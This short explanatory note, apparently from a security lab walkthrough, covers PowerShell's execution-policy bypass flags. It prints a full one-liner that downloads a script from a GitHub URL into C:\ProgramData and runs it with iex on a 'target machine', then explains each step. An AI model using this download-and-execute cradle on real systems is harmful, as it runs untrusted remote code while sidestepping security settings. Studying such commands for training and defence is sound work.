As part of the command line enter.

```
-ep Bypass -nop
```

so the example would be:
powershell.exe -ep Bypass -nop myfile.ps1

or more specifically
ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"


    he -ep Bypass -nop flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
    The DownloadFile method pulls a file (in this case, IS.ps1) from a remote server (https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1) and saves it in the C:\\ProgramData\\ directory on the target machine.
    Once downloaded, the script is executed with PowerShell using the iex command, which triggers the downloaded s.ps1 file.



